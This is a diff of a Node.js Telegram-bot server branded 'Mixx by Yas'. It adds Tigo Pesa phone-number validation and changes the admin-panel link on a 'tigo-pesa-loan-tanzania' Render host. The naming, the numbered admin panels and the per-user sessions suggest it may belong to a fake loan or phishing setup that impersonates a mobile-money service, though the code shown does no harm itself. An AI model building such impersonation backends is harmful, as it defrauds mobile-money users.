@@ -1,7 +1,9 @@
 /**
  * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
  * 
- * Updated: Sends user their own details and unique session link directly upon /start.
+ * Includes:
+ * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
+ * - Clean Admin Panel link without trailing query parameters on the base URL.
  */
 
 const express = require('express');
@@ -104,7 +106,8 @@ async function initBot() {
 
   /**
    * **INSTANT /START COMMAND HANDLER**
-   * Sends the requested personal info block directly back to the user on their phone.
+   * Displays the clean base link without trailing parameters in the main text block,
+   * keeping the user's specific chat ID isolated under personal information.
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -115,16 +118,15 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Custom Render Admin link ending with Admin-1 and appending the user's chat ID
-    const customAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1?chatId=${user.id}`;
+    // Clean base admin panel link
+    const cleanAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1`;
 
-    // Message sent directly to the user's phone chat window
     const userWelcomeInfo = 
       `🚨 **New User Started the Bot!**\n\n` +
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
       `🏷 **Username:** ${username}\n` +
-      `🔗 **Admin Panel Link:** [Open Session](${customAdminLink})`;
+      `🔗 **Admin Panel Link:** [${cleanAdminLink}](${cleanAdminLink})`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
       parse_mode: 'Markdown',
@@ -317,3 +319,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
   await initBot();
 });
+        
